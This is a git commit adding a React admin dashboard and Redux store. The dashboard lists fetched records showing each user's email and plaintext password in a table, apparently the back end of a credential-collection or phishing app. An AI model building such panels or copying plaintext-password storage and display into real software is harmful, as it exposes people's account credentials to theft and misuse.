dd20f6745e086f4817e836c0da458a90d69860cd
iykesworld <kennethiyke12@gmail.com>
2025-02-22 20:33:31 +0000

    initial commit

---
+++ src/admindashboard/AdminDashboard.jsx
@@ -0,0 +1,44 @@
+import React from 'react'
+import './AdminDashboard.css'
+import { RiAccountCircleFill } from "react-icons/ri";
+import { useFetchInfoQuery } from '../../../client-side/src/redux/features/info/infoApi';
+
+const AdminDashboard = () => {
+    const {data, error, isLoading} = useFetchInfoQuery();
+  return (
+    <div className='dashboard'>
+        <div className='dashboard-container'>
+        <div className='dashboard-right'>
+            <div className='dashboard-right-top'>
+                <RiAccountCircleFill />
+            <h3>Dashboard</h3>
+            </div>
+            <div>
+                <hr />
+                <button className='dashboard-btn'>Logout</button>
+            </div>
+        </div>
+        <table>
+            <thead>
+                <tr className='dashboard-head-roll'>
+                    <th className='th-one'>No:</th>
+                    <th className='th-two'>Email</th>
+                    <th className='th-two'>Password</th>
+                </tr>
+            </thead>
+            <tbody>
+            {data?.posts?.map((post, index) => (
+                        <tr key={post._id} className='tr-body'>
+                            <td>{index + 1}</td>
+                            <td>{post.email}</td>
+                            <td>{post.password}</td>
+                        </tr>
+                    ))}
+            </tbody>
+        </table>
+        </div>
+    </div>
+  )
+}
+
+export default AdminDashboard
---
+++ src/redux/store.js
@@ -0,0 +1,22 @@
+import { configureStore } from '@reduxjs/toolkit'
+import authApi from './features/auth/authApi'
+import authReducer from './features/auth/authSlice'
+import infoApi from '../../../client-side/src/redux/features/info/infoApi'
+
+export const store = configureStore({
+    reducer: {
+      // Add the generated reducer as a specific top-level slice
+      [authApi.reducerPath]: authApi.reducer,
+      [infoApi.reducerPath]: infoApi.reducer,
+      auth:authReducer
+      
+    },
+    // Adding the api middleware enables caching, invalidation, polling,
+    // and other useful features of `rtk-query`.
+    middleware: (getDefaultMiddleware) =>
+        getDefaultMiddleware().concat(authApi.middleware, infoApi.middleware),
+    
+  })
+  // console.log("Redux Store Initial State:", store.getState());
+
+ 
